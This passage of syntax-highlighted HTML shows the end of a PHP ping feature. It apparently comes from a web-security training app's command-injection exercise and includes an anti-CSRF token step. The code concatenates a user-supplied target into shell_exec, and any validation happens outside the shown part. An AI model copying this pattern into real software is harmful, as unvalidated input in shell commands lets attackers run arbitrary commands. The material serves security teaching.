vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// Determine OS and execute the ping command.</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #fcc28c; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">( stristr( php_uname( </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'s'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> ), </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'Windows NT'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> ) ) {</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// Windows</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">$cmd = shell_exec( </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'ping &nbsp;'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . $target );</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #fcc28c; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">else</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> {</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// *nix</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">$cmd = shell_exec( </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'ping &nbsp;-c 4 '</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . $target );</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// Feedback for the end user</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">$html .= </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">"&lt;pre&gt;{$cmd}&lt;/pre&gt;"</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">;</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #fcc28c; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">else</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> {</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// Ops. Let the user name theres a mistake</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">$html .= </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">;</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// Generate Anti-CSRF token</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">generateSessionToken();</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #fc9b9b; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">?&gt;</span></div></td></tr></tbody></table></div><br />